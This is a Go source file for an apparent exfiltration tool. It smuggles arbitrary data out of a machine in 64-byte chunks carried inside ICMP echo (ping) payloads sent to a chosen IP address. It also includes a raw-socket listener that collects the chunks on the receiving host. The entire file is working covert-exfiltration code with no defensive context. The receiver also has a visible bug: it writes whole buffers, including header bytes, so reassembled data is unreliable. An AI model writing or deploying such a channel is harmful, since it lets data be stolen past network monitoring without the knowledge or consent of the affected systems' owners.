package exfil

import (
	"fmt"
	"io"

	"net"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const (
	ICMP_EXFILTRATOR_CHUNK_SIZE = 64
)

type ICMP struct {
}

func NewICMP() *ICMP {
	return &ICMP{}
}

func (e *ICMP) Exfiltrate(data io.Reader, to string) error {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	bytes := make([]byte, ICMP_EXFILTRATOR_CHUNK_SIZE)

	for {
		n, err := data.Read(bytes)
		if err == io.EOF {
			return nil
		} else if err != nil {
			return err
		}

		// Create an ICMP echo message containing data
		msg := icmp.Message{
			Type: ipv4.ICMPTypeEcho,
			Body: &icmp.Echo{
				ID:   1,
				Seq:  1,
				Data: bytes[:n],
			},
		}

		// Marshal creates a raw ICMP message, including the checksum
		msgData, err := msg.Marshal(nil)
		if err != nil {
			return err
		}

		written, err := conn.WriteTo(msgData, &net.IPAddr{IP: net.ParseIP(to)})
		if err != nil {
			return err
		}

		if written != len(msgData) {
			return fmt.Errorf("wrote %d bytes, expected %d", written, len(msgData))
		}
	}
}

func (e *ICMP) Receive(output io.Writer) error {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	bytes := make([]byte, ICMP_EXFILTRATOR_CHUNK_SIZE)

	for {
		_, _, err := conn.ReadFrom(bytes)
		if err == io.EOF {
			return nil
		} else if err != nil {
			return err
		}

		output.Write(bytes)
	}
}
